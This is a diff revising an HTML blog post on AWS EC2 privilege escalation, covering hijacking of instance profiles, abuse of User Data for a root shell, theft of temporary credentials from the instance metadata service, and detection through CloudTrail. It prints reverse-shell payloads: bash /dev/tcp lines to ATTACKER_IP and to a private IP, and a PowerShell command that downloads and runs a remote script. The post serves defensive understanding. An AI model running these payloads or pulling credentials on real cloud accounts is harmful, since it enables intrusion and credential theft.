@@ -116,13 +116,14 @@
           <h2 class="section-heading">Steeling Instance Profiles</h2>
 
           <p>
-            Not much can be done to limit which instance profiles an EC2 instance can assume. Basically if there are instance profiles that exist in the account, then you can attach them to an EC2 that you are spinning up. This is all assuming that you have the permissions to spin up EC2 instances.
+            In practice there are not many controls that limit which instance profiles can be attached to an EC2 instance. One common approach is to create roles for developers and restrict which roles their EC2 instances can use with <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_switch-role-ec2.html#roles-usingrole-ec2instance-permissions" target="_blank">PassRole</a>. However, if instance profiles already exist in the account, they can generally be attached to any EC2 instance that a user launches and restricting developers to explicit roles is poor developer experience.
 
-            This is the main point of the post which is a little underwhelming, but its really worth keeping in mind that roles that you create for your EC2 instances can be hijacked by users in the account if they can also spin up EC2 instances.
+            This post assumes that a user has permission to launch EC2 instances, is not restricted by Service Control Policies (SCPs), and that the <inline-code>iam:PassRole</inline-code> permission is not limiting which roles they are allowed to attach to EC2 instances.
+
+            It is really worth keeping in mind that roles that you create for your EC2 instances can be hijacked by other users in the account if they can also spin up EC2 instances. But not every role can be hijacked, only roles that allow EC2 instances to assume them.
             <br><br>
             Roles in the account or Service Control Policies (SCPs) can limit who can spin up EC2 instances. SCPs are defined at an organisation level and I did not test SCPs in this blog post. The below hypothetical SCP example would only allow roles that start with "CICD" to spin up EC2 instances and you could have additional controls in place in your repos to prevent malicious pull/merge requests. This is a pretty weak control though, if new roles can be created a user could just name it correcly to bypass this control. 
-
-            <p></p>
+          <p></p>
             
 <code>{
   "Version": "2012-10-17",
@@ -282,17 +283,17 @@ bash -i >& /dev/tcp/172.31.34.136/60000 0>&1
             <li>An identical log to the one above exists for the GetObject eventName in the S3 data events</li>
             <li>Because these logs live in the S3 data events, if you are not collecting them you won't see the role being used outside of the EC2</li>
             <li>I could not find the Access Key: ASIAZ5UWVVHTJEKBDCJ3 in any other generic CloudTrail logs</li>
-            <li>The EC2 User Data being set can be seen in the <inline-code>eventName: "ModifyInstanceAttribute"</inline-code> log by filtering for <inline-code></inline-code>requestParameters.userData=*</inline-code>. The actual content of the User Data is redacted though, so can't be inspected for malicious content</li>
+            <li>The EC2 User Data being set can be seen in the <inline-code>eventName: "ModifyInstanceAttribute"</inline-code> log by filtering for <inline-code>requestParameters.userData=*</inline-code>. The actual content of the User Data is redacted though, so can't be inspected for malicious content</li>
 
           <h2 class="section-heading">Bypass Blocked SSH and SSM</h2>
 
           <p>Typically, SSH keys or AWS Systems Manager (SSM) are used to administer EC2 instances. But if those are disabled or inaccessible, an attacker who can supply or modify user data can execute commands as root. This allows them to query the Instance Metadata Service (IMDS) over the local link address <inline-code>169.254.169.254</inline-code> to retrieve temporary AWS credentials for the instance’s attached role.</p>
 
-          <p>Why does this work? The EC2 instance itself does not store credentials permanently. Instead, IMDS fetches temporary credentials on-demand from AWS STS (Security Token Service) for the role attached via the instance profile. Any process running on the instance can reach IMDS via the link-local IP, bypassing firewalls or lack of external access.</p>
+          <p>The EC2 instance itself does not store credentials permanently. Instead, IMDS fetches temporary credentials on-demand from AWS STS (Security Token Service) for the role attached via the instance profile. Any process running on the instance can reach IMDS via the link-local IP.</p>
 
           <h2 class="section-heading">Example Payloads</h2>
 
-          <p>Here are simple demonstration payloads showing how an attacker could leverage User Data for a shell. <strong>These are for demonstration only, do not use in production or in unowned environments.</strong></p>
+          <p>Here are simple demonstration payloads showing how an attacker could leverage User Data for a shell:</p>
 
           <p><u>Linux (Netcat Reverse Shell Example)</u>:</p>
           <code>#!/bin/bash
@@ -300,55 +301,54 @@ bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1</code>
 
           <p><u>Windows (PowerShell Reverse Shell Example)</u>:</p>
           <code>powershell -NoP -NonI -W Hidden -Exec Bypass -Command 
-            "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"</code>
+"IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"</code>
 
-          <p>Both payloads are executed with full administrative privileges on first boot through user data, demonstrating why User Data can be a critical escalation vector.</p>
+          <p>Both payloads are executed with full administrative privileges on first boot through user data.</p>
 
           <h2 class="section-heading">Preventing Abuse of EC2 User Data</h2>
 
           <p>You cannot disable User Data entirely, but you can control its use:</p>
           <ul>
             <li>Use Service Control Policies (SCPs) to restrict <inline-code>ec2:RunInstances</inline-code> or <inline-code>ec2:ModifyInstanceAttribute</inline-code> unless performed by trusted roles.</li>
-            <li>Enforce the use of IMDSv2 to reduce SSRF attacks (though this does not prevent local exploitation). <a href="https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service/" target="_blank">ref</a></li>
+            <li>Enforce the use of IMDSv2 to reduce SSRF attacks (though this does not prevent local exploitation) <a href="https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service/" target="_blank">ref</a>. With v1 attackers could remotely steal instance profiles if websites hosted on EC2s were vulnerable to SSRF <a href="https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/" target="_blank">ref</a> </li>
           </ul>
 
           <h2 class="section-heading">Observing User Data Activity in CloudWatch</h2>
 
-          <p>CloudTrail logs EC2 API calls such as <inline-code>RunInstances</inline-code> and <inline-code>ModifyInstanceAttribute</inline-code>. Suspicious patterns include:</p>
-          <ul>
-            <li>Instances launched with unexpected user data scripts</li>
-            <li>Modification of existing instance attributes, including user data</li>
-            <li>AssumeRole events following a newly launched instance</li>
-          </ul>
+          <p>CloudTrail logs EC2 API calls such as <inline-code>RunInstances</inline-code> and <inline-code>ModifyInstanceAttribute</inline-code>. These can be used to see if user data is set, but from my experience the user data is redacted from these logs. A defender would therefore need to have access to the account they are investigating to view what the user data is set to. Getting this programmatically using the CLI or Boto is also possible:</p>
 
-          <p>CloudWatch Alarms or EventBridge rules can be set up to trigger on these events:</p>
           <code>
-          {
-            "source": ["aws.ec2"],
-            "detail-type": ["AWS API Call via CloudTrail"],
-            "detail": {
-              "eventName": ["RunInstances", "ModifyInstanceAttribute"],
-              "requestParameters": {
-                "userData": [{"exists": true}]
-              }
-            }
-          }
+          aws ec2 describe-instance-attribute \
+          --instance-id i-xxxx \
+          --attribute userData
           </code>
 
-          <p>Alerts can notify security teams immediately if instances are launched or modified with unexpected user data, allowing quick investigation and remediation.</p>
+          <p>If you were worried about users at your org getting shells from EC2 instances using user data, I would recommend setting up an alert that looks for user data being present in CloudTrail logs using a filter like: <inline-code>requestParameters.userData=*</inline-code> and then using a globally privileged role and AWS CLI to programmatically read the userData attribute to enrich the ticket.</p>
 
           <h2 class="section-heading">Conclusion</h2>
+         
+          <p>
+          If a user in an AWS account can launch EC2 instances and there are interesting instance profiles lying around, those roles are effectively fair game. By spinning up an EC2 instance with the profile attached and supplying a bit of user data, it is trivial to get a root shell and pull the temporary STS credentials straight from the Instance Metadata Service. At that point the EC2 instance has done its job and the credentials can be reused anywhere until they expire.
+          </p>
 
-          <p>EC2 User Data is a powerful tool for automation but can be misused for privilege escalation. Understanding its interaction with IMDS, instance profiles, and temporary credentials is essential for defenders. By controlling who can launch instances, restricting user data, separating roles, and monitoring CloudTrail events, you can greatly reduce the risk of abuse.</p>
+          <p>
+          From a defender's perspective there are a few useful takeaways. The IMDS credential requests themselves are invisible to CloudTrail, but the surrounding activity isn't. Launching instances, modifying user data, associating instance profiles, and using the stolen credentials against services like S3 all leave traces if you are collecting the right logs (i.e. S3 data events in this example). One annoyance is that CloudTrail redacts the actual user data, so if you want to know what someone really ran you will need to go back to the EC2 instance and retrieve it directly.
+          </p>
 
-          <p>If you are digging deeper into AWS security, exploring techniques like this is a great way to understand both attack and defense strategies.</p>
+          <p>
+          The real defence is controlling who can spin up EC2 instances and what roles they are allowed to use. If developers can freely launch instances and attach any instance profile in the account, you should assume those roles are usable by anyone. Detection helps, but well thought out IAM boundaries and setting up multiple accounts per project or accounts per team can go a long way in limiting your exposure to the techniques discussed.
+          </p>
+
+          <p>
+          This research and reading has convinced me that it is a good idea to have many accounts at an org. This clearly increases overhead, but limits exposure to a lot of attacks.
+          </p>
           
-          <h2 class="section-heading">Bonus: Additional things learnt</h2>
+          <h2 class="section-heading">Bonus Take Aways</h2>
 
-          <li>The instance profile associated with the EC2 is hot swappable, just call: DisassociateIamInstanceProfile and AssociateIamInstanceProfile</li>
-          <li>Calling: DisassociateIamInstanceProfile or AssociateIamInstanceProfile generates CloudTrail logs</li>
+          <li>The instance profile associated with the EC2 is hot swappable, just call: <inline-code></inline-code>DisassociateIamInstanceProfile</inline-code> and <inline-code>AssociateIamInstanceProfile</inline-code></li>
+          <li>Calling: <inline-code>DisassociateIamInstanceProfile</inline-code> or <inline-code>AssociateIamInstanceProfile</inline-code> generates CloudTrail logs</li>
           <li>When an IAM role is revoked the STS creds associated with the role keep working until they expire</li>
-          <li>When an IAM role is revoked the role stops working for the instance using the role, so any STS keys generated by the instance from that point on don't work. This can be fixed if the role is re-associated with the instance using the DisassociateIamInstanceProfile/AssociateIamInstanceProfile API calls.</li>
+          <li>When an IAM role is revoked the role stops working for the instance using the role, so any STS keys generated by the instance from that point on don't work. This can be fixed if the role is re-associated with the instance using the <inline-code>DisassociateIamInstanceProfile</inline-code>/<inline-code>AssociateIamInstanceProfile</inline-code> API calls.</li>
 
         </div>
       </div>
